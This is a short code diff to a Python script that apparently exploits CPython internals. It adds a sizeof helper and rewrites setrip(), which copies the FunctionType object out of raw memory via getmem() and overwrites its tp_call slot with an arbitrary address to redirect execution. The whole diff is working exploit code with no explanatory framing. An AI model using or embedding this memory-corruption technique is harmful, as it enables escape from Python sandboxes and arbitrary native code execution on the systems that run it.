@@ -7,9 +7,14 @@ CodeType = nullfunc.__code__.__class__
 FunctionType = nullfunc.__class__
 
 
+# Thanks @chilaxan
+def sizeof(obj):
+	return type(obj).__sizeof__(obj)
+
+
 IS_PY2 = not 2/3
-BYTES_HEADER_LEN = 0x24 if IS_PY2 else 0x20
-TUPLE_HEADER_LEN = 0x18
+BYTES_HEADER_LEN = sizeof(b"")-1
+TUPLE_HEADER_LEN = sizeof(())
 
 INT64_MAX =  (1<<63)-1
 INT32_MAX =  (1<<31)-1
@@ -140,7 +145,9 @@ def getmem():
 
 def setrip(addr):
 	# make a copy of the built-in function type object
-	my_functype = getmem()[id(FunctionType):id(FunctionType)+0x800]
+	ft_addr = addrof(FunctionType)
+	ft_len = sizeof(FunctionType)
+	my_functype = getmem()[ft_addr:ft_addr+ft_len]
 
 	# patch tp_call
 	my_functype[0x80:0x88] = p64a(addr)
